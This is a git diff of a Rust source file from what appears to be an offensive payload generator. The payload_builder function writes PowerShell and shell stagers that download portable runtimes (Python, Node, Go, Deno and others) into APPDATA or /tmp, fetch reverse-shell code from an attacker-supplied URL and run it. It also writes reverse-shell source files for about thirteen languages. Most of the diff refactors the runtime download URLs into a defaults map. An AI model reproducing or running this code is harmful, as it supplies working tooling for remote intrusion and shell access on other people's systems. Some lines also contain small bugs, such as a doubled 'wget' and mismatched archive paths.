@@ -1,23 +1,52 @@
 use std::fs::OpenOptions;
 use std::io::Write;
-pub mod payloads;
+use defaults::OS_TO_DOWNLOAD_HASHMAP;
 pub mod arguments;
+pub mod defaults;
+pub mod payloads;
+pub mod validate_urls;
 
-pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &str, allarg: &str, lhostarg: &str, lportarg: &str, urlarg: &str) {
+fn get_lang_dl(lang: &str, platform: &str) -> Option<&'static str> {
+    // Access the appropriate OS's download map
+    if let Some(os_map) = OS_TO_DOWNLOAD_HASHMAP.get(platform) {
+        // Access the language-specific URL within the OS map
+        if let Some(url) = os_map.get(lang) {
+            Some(url)
+        } else {
+            println!("No default download URL found for the given language.");
+            None
+        }
+    } else {
+        println!("No default download URL found for the given platform.");
+        None
+    }
+}
+
+pub fn payload_builder(
+    platform: &str,
+    language: &str,
+    payload: &str,
+    output: &str,
+    allarg: &str,
+    lhostarg: &str,
+    lportarg: &str,
+    urlarg: &str,
+) {
     if platform == "windows" {
-        let tcl_payload = format!("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/tclkit/tclkitsh-8.5.9-win32-x86_64.zip -O $env:APPDATA\\tclkitsh8.zip\nExpand-Archive -Path $env:APPDATA\\tclkitsh8.zip -DestinationPath $env:APPDATA\\tclkitsh8\nwget {}{}.tcl -O $env:APPDATA\\{}.tcl\n& \"$env:APPDATA\\tclkitsh8\\tclkitsh-8.5.9-win32-x86_64.exe\" @('$env:APPDATA\\{}.tcl')\n", &urlarg, &output, &output, &output);
-        let php_payload = format!("wget https://windows.php.net/downloads/releases/php-8.3.6-nts-Win32-vs16-x64.zip -O $env:APPDATA\\php8.zip\nExpand-Archive -Path $env:APPDATA\\php8.zip -DestinationPath $env:APPDATA\\php8\nwget {}{}.php -O $env:APPDATA\\{}.php\n& \"$env:APPDATA\\php8\\\\php.exe\" @('$env:APPDATA\\{}.php')\n", &urlarg, &output, &output, &output);
-        let crystal_payload = format!("wget https://github.com/crystal-lang/crystal/releases/download/1.12.1/crystal-1.12.1-windows-x86_64-msvc-unsupported.zip -O $env:APPDATA\\crystalmethod.zip\nExpand-Archive -Path $env:APPDATA\\crystalmethod.zip -DestinationPath $env:APPDATA\\crystalmethod\nwget {}{}.cr -O $env:APPDATA\\{}.cr\n& \"$env:APPDATA\\crystalmethod\\\\crystal.exe\" @('run', '$env:APPDATA\\{}.cr')\n", &urlarg, &output, &output, &output);
-        let julia_payload = format!("wget https://julialang-s3.julialang.org/bin/winnt/x64/1.10/julia-1.10.2-win64.zip -O $env:APPDATA\\juliachilds.zip\nExpand-Archive -Path $env:APPDATA\\juliachilds.zip -DestinationPath $env:APPDATA\\juliachilds\nwget {}{}.jl -O $env:APPDATA\\juliachilds\\\\{}.jl\n& \"$env:APPDATA\\juliachilds\\\\julia-1.10.2\\\\bin\\\\julia.exe\" @('$env:APPDATA\\juliachilds\\{}.jl')\n", &urlarg, &output, &output, &output);
-        let go_payload = format!("wget https://go.dev/dl/go1.22.2.windows-amd64.zip -O $env:APPDATA\\go1.22.zip\nExpand-Archive -Path $env:APPDATA\\go.1.22.zip -DestinationPath $env:APPDATA\\go1.22\nwget {}{}.go -O $env:APPDATA\\{}.go\n& \"$env:APPDATA\\go1.22\\\\go\\\\bin\\\\go.exe\" @('run', '$env:APPDATA\\{}.go')\n", &urlarg, &output, &output, &output);
-        let dart_payload = format!("wget https://storage.googleapis.com/dart-archive/channels/stable/release/3.3.4/sdk/dartsdk-windows-x64-release.zip -O $env:APPDATA\\dartwingduck.zip\nExpand-Archive -Path $env:APPDATA\\dartwingduck.zip -DestinationPath $env:APPDATA\\dartwingduck\nwget {}{}.dart -O $env:APPDATA\\dartwingduck\\\\{}.dart\n& \"$env:APPDATA\\dartwingduck\\\\dart-sdk\\\\bin\\\\dart.exe\" @('$env:APPDATA\\dartwingduck\\{}.dart')\n", &urlarg, &output, &output, &output);
-        let d_payload = format!("wget https://downloads.dlang.org/releases/2.x/2.108.0/dmd.2.108.0.windows.zip -O $env:APPDATA\\deeznuts.zip\nExpand-Archive -Path $env:APPDATA\\deeznuts.zip -DestinationPath $env:APPDATA\\deeznuts\nwget {}{}.d -O $env:APPDATA\\deeznuts\\\\{}.d\n& \"$env:APPDATA\\deeznuts\\\\dmd2\\\\windows\\\\bin64\\\\dmd.exe\" @('$env:APPDATA\\deeznuts\\{}.d')\n", &urlarg, &output, &output, &output);
-        let v_payload = format!("wget https://github.com/vlang/v/releases/latest/download/v_windows.zip -O $env:APPDATA\\vendetta.zip\nExpand-Archive -Path $env:APPDATA\\vendetta.zip -DestinationPath $env:APPDATA\\vendetta\nwget {}{}.v -O $env:APPDATA\\vendetta\\\\{}.v\n& \"$env:APPDATA\\vendetta\\\\v\\\\v.exe\" @('run', '$env:APPDATA\\vendetta\\{}.v')\n", &urlarg, &output, &output, &output);
-        let node_payload = format!("wget https://nodejs.org/dist/v20.12.2/node-v20.12.2-win-x64.zip -O $env:APPDATA\\noodles.zip\nExpand-Archive -Path $env:APPDATA\\noodles.zip -DestinationPath $env:APPDATA\\noodles\nwget {}{}.js -O $env:APPDATA\\{}.js\n& \"$env:APPDATA\\noodles\\\\node-v20.12.2-win-x64\\\\node.exe\" @('$env:APPDATA\\noodles\\{}.js')\n", &urlarg, &output, &output, &output);
-        let bun_payload = format!("wget https://github.com/oven-sh/bun/releases/download/bun-v1.1.18/bun-windows-x64.zip -O $env:APPDATA\\bun.zip\nExpand-Archive -Path $env:APPDATA\\bun.zip -DestinationPath $env:APPDATA\nwget {}/{}.tsx -O $env:APPDATA\\{}.tsx\n& \"$env:APPDATA\\bun-windows-x64\\bun.exe\" @('run', \"$env:APPDATA\\{}.tsx\")\n", &urlarg, &output, &output, &output);
-        let python_payload = format!("wget https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip -O $env:APPDATA\\python3.zip\nExpand-Archive -Path $env:APPDATA\\python3.zip -DestinationPath $env:APPDATA\\python3\nwget {}{}.py -O $env:APPDATA\\python3\\\\{}.py\n& \"$env:APPDATA\\python3\\\\python.exe\" @('$env:APPDATA\\python3\\{}.py')\n", &urlarg, &output, &output, &output);
-        let fsharp_payload = format!("wget https://download.visualstudio.microsoft.com/download/pr/bf435b42-3f28-45db-a666-6e95c4faefe7/23e0b703124347b51f53faf64c829287/dotnet-sdk-8.0.204-win-x64.zip -O $env:APPDATA\\dotnet8.zip\nExpand-Archive -Path $env:APPDATA\\dotnet8.zip -DestinationPath $env:APPDATA\\dotnet8\nwget {}{}.fsx -O $env:APPDATA\\dotnet8\\\\{}.fsx\n& \"$env:APPDATA\\dotnet8\\\\dotnet.exe\" @('fsi', '$env:APPDATA\\dotnet8\\{}.fsx')\n", &urlarg, &output, &output, &output);
-        let deno_payload = format!("wget https://github.com/denoland/deno/releases/download/v1.45.1/deno-x86_64-pc-windows-msvc.zip -O $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip\nExpand-Archive -Path $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip -DestinationPath $env:APPDATA\nwget {}/{}.ts -O $env:APPDATA\\{}.ts\n& \"$env:APPDATA\\deno.exe\" @('run', '--allow-net', '--allow-run', \"$env:APPDATA\\{}.ts\")", &urlarg, &output, &output, &output);
+
+        let tcl_payload = format!("wget {} -O $env:APPDATA\\tclkitsh8.zip\nExpand-Archive -Path $env:APPDATA\\tclkitsh8.zip -DestinationPath $env:APPDATA\\tclkitsh8\nwget {}{}.tcl -O $env:APPDATA\\{}.tcl\n& \"$env:APPDATA\\tclkitsh8\\tclkitsh-8.5.9-win32-x86_64.exe\" @('$env:APPDATA\\{}.tcl')\n", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let php_payload = format!("wget {} -O $env:APPDATA\\php8.zip\nExpand-Archive -Path $env:APPDATA\\php8.zip -DestinationPath $env:APPDATA\\php8\nwget {}{}.php -O $env:APPDATA\\{}.php\n& \"$env:APPDATA\\php8\\\\php.exe\" @('$env:APPDATA\\{}.php')\n", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let crystal_payload = format!("wget {} -O $env:APPDATA\\crystalmethod.zip\nExpand-Archive -Path $env:APPDATA\\crystalmethod.zip -DestinationPath $env:APPDATA\\crystalmethod\nwget {}{}.cr -O $env:APPDATA\\{}.cr\n& \"$env:APPDATA\\crystalmethod\\\\crystal.exe\" @('run', '$env:APPDATA\\{}.cr')\n", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let julia_payload = format!("wget {} -O $env:APPDATA\\juliachilds.zip\nExpand-Archive -Path $env:APPDATA\\juliachilds.zip -DestinationPath $env:APPDATA\\juliachilds\nwget {}{}.jl -O $env:APPDATA\\juliachilds\\\\{}.jl\n& \"$env:APPDATA\\juliachilds\\\\julia-1.10.2\\\\bin\\\\julia.exe\" @('$env:APPDATA\\juliachilds\\{}.jl')\n", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let go_payload = format!("wget {} -O $env:APPDATA\\go1.22.zip\nExpand-Archive -Path $env:APPDATA\\go.1.22.zip -DestinationPath $env:APPDATA\\go1.22\nwget {}{}.go -O $env:APPDATA\\{}.go\n& \"$env:APPDATA\\go1.22\\\\go\\\\bin\\\\go.exe\" @('run', '$env:APPDATA\\{}.go')\n", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let dart_payload = format!("wget {} -O $env:APPDATA\\dartwingduck.zip\nExpand-Archive -Path $env:APPDATA\\dartwingduck.zip -DestinationPath $env:APPDATA\\dartwingduck\nwget {}{}.dart -O $env:APPDATA\\dartwingduck\\\\{}.dart\n& \"$env:APPDATA\\dartwingduck\\\\dart-sdk\\\\bin\\\\dart.exe\" @('$env:APPDATA\\dartwingduck\\{}.dart')\n", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let d_payload = format!("wget {} -O $env:APPDATA\\deeznuts.zip\nExpand-Archive -Path $env:APPDATA\\deeznuts.zip -DestinationPath $env:APPDATA\\deeznuts\nwget {}{}.d -O $env:APPDATA\\deeznuts\\\\{}.d\n& \"$env:APPDATA\\deeznuts\\\\dmd2\\\\windows\\\\bin64\\\\dmd.exe\" @('$env:APPDATA\\deeznuts\\{}.d')\n", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let v_payload = format!("wget {} -O $env:APPDATA\\vendetta.zip\nExpand-Archive -Path $env:APPDATA\\vendetta.zip -DestinationPath $env:APPDATA\\vendetta\nwget {}{}.v -O $env:APPDATA\\vendetta\\\\{}.v\n& \"$env:APPDATA\\vendetta\\\\v\\\\v.exe\" @('run', '$env:APPDATA\\vendetta\\{}.v')\n", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let node_payload = format!("wget {} -O $env:APPDATA\\noodles.zip\nExpand-Archive -Path $env:APPDATA\\noodles.zip -DestinationPath $env:APPDATA\\noodles\nwget {}{}.js -O $env:APPDATA\\{}.js\n& \"$env:APPDATA\\noodles\\\\node-v20.12.2-win-x64\\\\node.exe\" @('$env:APPDATA\\noodles\\{}.js')\n", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let bun_payload = format!("wget {} -O $env:APPDATA\\bun.zip\nExpand-Archive -Path $env:APPDATA\\bun.zip -DestinationPath $env:APPDATA\nwget {}/{}.tsx -O $env:APPDATA\\{}.tsx\n& \"$env:APPDATA\\bun-windows-x64\\bun.exe\" @('run', \"$env:APPDATA\\{}.tsx\")\n", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let python_payload = format!("wget {} -O $env:APPDATA\\python3.zip\nExpand-Archive -Path $env:APPDATA\\python3.zip -DestinationPath $env:APPDATA\\python3\nwget {}{}.py -O $env:APPDATA\\python3\\\\{}.py\n& \"$env:APPDATA\\python3\\\\python.exe\" @('$env:APPDATA\\python3\\{}.py')\n", &get_lang_dl("python", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let fsharp_payload = format!("wget {} -O $env:APPDATA\\dotnet8.zip\nExpand-Archive -Path $env:APPDATA\\dotnet8.zip -DestinationPath $env:APPDATA\\dotnet8\nwget {}{}.fsx -O $env:APPDATA\\dotnet8\\\\{}.fsx\n& \"$env:APPDATA\\dotnet8\\\\dotnet.exe\" @('fsi', '$env:APPDATA\\dotnet8\\{}.fsx')\n", &get_lang_dl("fsharp", platform).unwrap().to_string(),  &urlarg, &output, &output, &output);
+        let deno_payload = format!("wget {} -O $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip\nExpand-Archive -Path $env:APPDATA\\deno-x86_64-pc-windows-msvc.zip -DestinationPath $env:APPDATA\nwget {}/{}.ts -O $env:APPDATA\\{}.ts\n& \"$env:APPDATA\\deno.exe\" @('run', '--allow-net', '--allow-run', \"$env:APPDATA\\{}.ts\")", &get_lang_dl("deno", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
 
         let win_payloads = payloads::Payloads::new(
             &tcl_payload,
@@ -64,150 +93,129 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
         );
         let p_res = if language == "tcl" {
             win_payloads.tcl_payload()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             win_payloads.php_payload()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             win_payloads.crystal_payload()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             win_payloads.julia_payload()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             win_payloads.go_payload()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             win_payloads.dart_payload()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             win_payloads.d_payload()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             win_payloads.v_payload()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             win_payloads.node_payload()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             win_payloads.bun_payload()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             win_payloads.python_payload()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             win_payloads.fsharp_payload()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             win_payloads.deno_payload()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_shell = if language == "tcl" {
             reverse_shell.tcl_revshell()
-        }else if language == "php" {
+        } else if language == "php" {
             reverse_shell.php_revshell()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             reverse_shell.crystal_revshell()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             reverse_shell.julia_revshell()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             reverse_shell.go_revshell()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             reverse_shell.dart_revshell()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             reverse_shell.d_revshell()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             reverse_shell.v_revshell()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             reverse_shell.node_revshell()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             reverse_shell.bun_revshell()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             reverse_shell.python_revshell()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             reverse_shell.f_revshell()
-        }
-        else if language == "deno" {
+        } else if language == "deno" {
             reverse_shell.deno_revshell()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let p_ext = if language == "tcl" {
             ".tcl".to_string()
-        }
-        else if language == "php" {
+        } else if language == "php" {
             ".php".to_string()
-        }
-        else if language == "crystal" {
+        } else if language == "crystal" {
             ".cr".to_string()
-        }
-        else if language == "julia" {
+        } else if language == "julia" {
             ".jl".to_string()
-        }
-        else if language == "golang" {
+        } else if language == "golang" {
             ".go".to_string()
-        }
-        else if language == "dart" {
+        } else if language == "dart" {
             ".dart".to_string()
-        }
-        else if language == "dlang" {
+        } else if language == "dlang" {
             ".d".to_string()
-        }
-        else if language == "vlang" {
+        } else if language == "vlang" {
             ".v".to_string()
-        }
-        else if language == "nodejs" {
+        } else if language == "nodejs" {
             ".js".to_string()
-        }
-        else if language == "bun" {
+        } else if language == "bun" {
             ".tsx".to_string()
-        }
-        else if language == "python" {
+        } else if language == "python" {
             ".py".to_string()
-        }
-        else if language == "fsharp" {
+        } else if language == "fsharp" {
             ".fsx".to_string()
-        } 
-        else if language == "deno" {
+        } else if language == "deno" {
             ".ts".to_string()
-        }
-        else if language == "empty" {
+        } else if language == "empty" {
             "Building payload for every language...".to_string()
-        }
-        else {
+        } else {
             arguments::getargs()
-        }.to_string();
+        }
+        .to_string();
 
         let ext = if payload == "pwsh" || payload == "PowerShell" || payload == "powershell" {
             ".ps1"
         } else {
             ".sh"
-        }.to_string();
-        let outfile = output.to_string()+&ext;
-        let revfile = output.to_string()+&p_ext;
+        }
+        .to_string();
+        let outfile = output.to_string() + &ext;
+        let revfile = output.to_string() + &p_ext;
         if allarg == "true" {
-            for payload in [ &win_payloads.tcl_payload(), &win_payloads.php_payload(), &win_payloads.crystal_payload(), &win_payloads.julia_payload(), &win_payloads.go_payload(), &win_payloads.dart_payload(), &win_payloads.d_payload(), &win_payloads.v_payload(), &win_payloads.node_payload(), &win_payloads.bun_payload(), &win_payloads.python_payload(), &win_payloads.fsharp_payload(), &win_payloads.deno_payload()].iter() {
+            for payload in [
+                &win_payloads.tcl_payload(),
+                &win_payloads.php_payload(),
+                &win_payloads.crystal_payload(),
+                &win_payloads.julia_payload(),
+                &win_payloads.go_payload(),
+                &win_payloads.dart_payload(),
+                &win_payloads.d_payload(),
+                &win_payloads.v_payload(),
+                &win_payloads.node_payload(),
+                &win_payloads.bun_payload(),
+                &win_payloads.python_payload(),
+                &win_payloads.fsharp_payload(),
+                &win_payloads.deno_payload(),
+            ]
+            .iter()
+            {
                 //println!("{}", payload);
                 // Open a file with append option
                 let mut data_file = OpenOptions::new()
@@ -221,34 +229,72 @@ pub fn payload_builder(platform: &str, language: &str, payload: &str, output: &s
                     .write_all(payload.as_bytes())
                     .expect("write failed");
             }
-            let source_array = [ &reverse_shell.tcl_revshell(), &reverse_shell.php_revshell(), &reverse_shell.crystal_revshell(), &reverse_shell.julia_revshell(), &reverse_shell.go_revshell(), &reverse_shell.dart_revshell(), &reverse_shell.d_revshell(), &reverse_shell.v_revshell(), &reverse_shell.node_revshell(), &reverse_shell.bun_revshell(), &reverse_shell.python_revshell(), &reverse_shell.f_revshell(), &reverse_shell.deno_revshell()];
-            let ext_array = [".tcl".to_string(), ".php".to_string(), ".cr".to_string(), ".jl".to_string(), ".go".to_string(), ".dart".to_string(), ".d".to_string(), ".v".to_string(), ".js".to_string(), ".tsx".to_string(), ".py".to_string(), ".r".to_string(), ".fsx".to_string(), ".ts".to_string()];
+            let source_array = [
+                &reverse_shell.tcl_revshell(),
+                &reverse_shell.php_revshell(),
+                &reverse_shell.crystal_revshell(),
+                &reverse_shell.julia_revshell(),
+                &reverse_shell.go_revshell(),
+                &reverse_shell.dart_revshell(),
+                &reverse_shell.d_revshell(),
+                &reverse_shell.v_revshell(),
+                &reverse_shell.node_revshell(),
+                &reverse_shell.bun_revshell(),
+                &reverse_shell.python_revshell(),
+                &reverse_shell.f_revshell(),
+                &reverse_shell.deno_revshell(),
+            ];
+            let ext_array = [
+                ".tcl".to_string(),
+                ".php".to_string(),
+                ".cr".to_string(),
+                ".jl".to_string(),
+                ".go".to_string(),
+                ".dart".to_string(),
+                ".d".to_string(),
+                ".v".to_string(),
+                ".js".to_string(),
+                ".tsx".to_string(),
+                ".py".to_string(),
+                ".r".to_string(),
+                ".fsx".to_string(),
+                ".ts".to_string(),
+            ];
             for (revcode, revext) in source_array.iter().zip(ext_array.iter()) {
-                let payloadfile = output.to_string()+&revext;
-                let mut revshell_source = std::fs::File::create(payloadfile).expect("create failed");
-                revshell_source.write_all(revcode.as_bytes()).expect("write failed");
+                let payloadfile = output.to_string() + &revext;
+                let mut revshell_source =
+                    std::fs::File::create(payloadfile).expect("create failed");
+                revshell_source
+                    .write_all(revcode.as_bytes())
+                    .expect("write failed");
             }
-
         } else {
             let mut payload_main = std::fs::File::create(outfile).expect("create failed");
-            payload_main.write_all(p_res.as_bytes()).expect("write failed");
+            payload_main
+                .write_all(p_res.as_bytes())
+                .expect("write failed");
             let mut revshell_source = std::fs::File::create(revfile).expect("create failed");
-            revshell_source.write_all(p_shell.as_bytes()).expect("write failed");
+            revshell_source
+                .write_all(p_shell.as_bytes())
+                .expect("write failed");
         }
     } else if platform == "linux" {
-        let tcl_payload = format!("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/tclkit/tclkitsh-8.5.9-linux-ix86.gz -O /tmp/tclkit8.gz;gzip -d /tmp/tclkit8.gz;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &urlarg, &output, &output, &output);
-        let php_payload = format!("wget https://dl.static-php.dev/static-php-cli/common/php-8.3.6-cli-linux-x86_64.tar.gz -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x ./tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &urlarg, &output, &output, &output);
-        let crystal_payload = format!("wget https://github.com/crystal-lang/crystal/releases/download/1.12.1/crystal-1.12.1-1-linux-x86_64.tar.gz -O /tmp/crystal.tar.gz;tar xzvf crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &urlarg, &output, &output, &output);
-        let julia_payload = format!("wget https://julialang-s3.julialang.org/bin/linux/x64/1.10/julia-1.10.3-linux-x86_64.tar.gz -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &urlarg, &output, &output, &output);
-        let go_payload = format!("wget https://go.dev/dl/go1.22.3.linux-amd64.tar.gz -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &urlarg, &output, &output, &output);
-        let dart_payload = format!("wget https://storage.googleapis.com/dart-archive/channels/stable/release/3.3.4/sdk/dartsdk-linux-x64-release.zip -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &urlarg, &output, &output, &output);
-        let d_payload = format!("wget https://downloads.dlang.org/releases/2.x/2.108.1/dmd.2.108.1.linux.zip -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/linux/bin64/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/linux/bin64/dmd /tmp/{}.d')\n", &urlarg, &output, &output, &output);
-        let v_payload = format!("wget https://github.com/vlang/v/releases/download/weekly.2024.19/v_linux.zip -O /tmp/v_linux.zip;unzip /tmp/v_linux.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v run /tmp/{}.v", &urlarg, &output, &output, &output);
-        let node_payload = format!("wget https://nodejs.org/dist/v20.12.2/node-v20.12.2-linux-x64.tar.gz -O /tmp/node-v20.12.2-linux-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-linux-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-linux-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-linux-x64/bin/node /tmp/{}.js", &urlarg, &output, &output, &output);
-        let bun_payload = format!("wget https://github.com/oven-sh/bun/releases/download/bun-v1.1.18/bun-linux-x64.zip -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &urlarg, &output, &output, &output);
-        let python_payload = format!("wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py", &urlarg, &output, &output, &output);
-        let fsharp_payload = format!("wget https://download.visualstudio.microsoft.com/download/pr/0a1b3cbd-b4af-4d0d-9ed7-0054f0e200b4/4bcc533c66379caaa91770236667aacb/dotnet-sdk-8.0.204-linux-x64.tar.gz -O /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz;tar xzvf /tmp/dotnet-sdk-8.0.204-linux-x64.tar.gz -C /tmp;chmod +x /tmp/dotnet;wget {}/{}.fsx -O /tmp/{}.fsx;/tmp/dotnet/dotnet fsi /tmp/{}.fsx", &urlarg, &output, &output, &output);
-        let deno_payload = format!("wget https://github.com/denoland/deno/releases/download/v1.45.1/deno-x86_64-unknown-linux-gnu.zip -O /tmp/deno-x86_64-unknown-linux-gnu.zip;unzip /tmp/deno-x86_64-unknown-linux-gnu.zip -d /tmp/deno-x86_64-unknown-linux-gnu/;chmod +x /tmp/deno-x86_64-unknown-linux-gnu/deno;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/deno-x86_64-unknown-linux-gnu/deno run --allow-net --allow-run /tmp/{}.ts", &urlarg, &output, &output, &output);
+        let tcl_payload = format!("wget {} -O /tmp/tclkit8.gz;gzip -d /tmp/tclkit8.gz;chmod +x /tmp/tclkit8;wget {}/{}.tcl -O /tmp/{}.tcl;/tmp/tclkit8 /tmp/{}.tcl", &get_lang_dl("tcl", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let php_payload = format!("wget {} -O /tmp/php8.tar.gz;tar xzvf /tmp/php8.tar.gz -C /tmp;chmod +x ./tmp/php;wget {}/{}.php -O /tmp/{}.php;/tmp/php /tmp/{}.php", &get_lang_dl("php", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let crystal_payload = format!("wget {} -O /tmp/crystal.tar.gz;tar xzvf crystal.tar.gz -C /tmp;chmod +x /tmp/crystal-1.12.1-1/bin/crystal;wget wget {}/{}.cr -O /tmp/{}.cr;/tmp/crystal-1.12.1-1/bin/crystal run /tmp/{}.cr", &get_lang_dl("crystal", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let julia_payload = format!("wget {} -O /tmp/julia.tar.gz;tar xzvf /tmp/julia.tar.gz -C /tmp;chmod +x /tmp/julia-1.10.3/bin/julia;wget {}/{}.jl -O /tmp/{}.jl;/tmp/julia-1.10.3/bin/julia /tmp/{}.jl", &get_lang_dl("julia", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let go_payload = format!("wget {} -O /tmp/go.tar.gz;tar xzvf /tmp/go.tar.gz -C /tmp;chmod +x /tmp/go/bin/go;wget {}/{}.go -O /tmp/{}.go;/tmp/go/bin/go run /tmp/{}.go", &get_lang_dl("golang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let dart_payload = format!("wget {} -O /tmp/dart.zip;unzip /tmp/dart.zip -d /tmp/dart-sdk/;chmod +x /tmp/dart-sdk/bin/dart;wget {}/{}.dart -O /tmp/{}.dart;/tmp/dart-sdk/bin/dart /tmp/{}.dart", &get_lang_dl("dart", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let d_payload = format!("wget {} -O /tmp/dmd.zip;unzip /tmp/dmd.zip -d /tmp/dmd2/;chmod +x /tmp/dmd2/linux/bin64/dmd;wget {}/{}.d -O /tmp/{}.d;/tmp/dmd2/linux/bin64/dmd /tmp/{}.d')\n", &get_lang_dl("dlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let v_payload = format!("wget {} -O /tmp/v_linux.zip;unzip /tmp/v_linux.zip -d /tmp/v/;chmod +x /tmp/v/v;wget {}/{}.v -O /tmp/{}.v;/tmp/v/v run /tmp/{}.v", &get_lang_dl("vlang", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let node_payload = format!("wget {} -O /tmp/node-v20.12.2-linux-x64.tar.gz;tar xzvf /tmp/node-v20.12.2-linux-x64.tar.gz -C /tmp;chmod +x /tmp/node-v20.12.2-linux-x64/bin/node;wget {}/{}.js -O /tmp/{}.js;/tmp/node-v20.12.2-linux-x64/bin/node /tmp/{}.js", &get_lang_dl("nodejs", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let bun_payload = format!("wget {} -O /tmp/bun.zip;unzip /tmp/bun.zip -d /tmp/bun-linux-x64/;chmod +x /tmp/bun-linux-x64/bun;wget {}/{}.tsx -O /tmp/{}.tsx;/tmp/bun-linux-x64/bun /tmp/{}.tsx", &get_lang_dl("bun", platform).unwrap().to_string(), &urlarg, &output, &output, &output);
+        let python_payload = format!(
+            "wget {}/{}.py -O /tmp/{}.py;python3 /tmp/{}.py",
+            &urlarg, &output, &output, &output
+        );
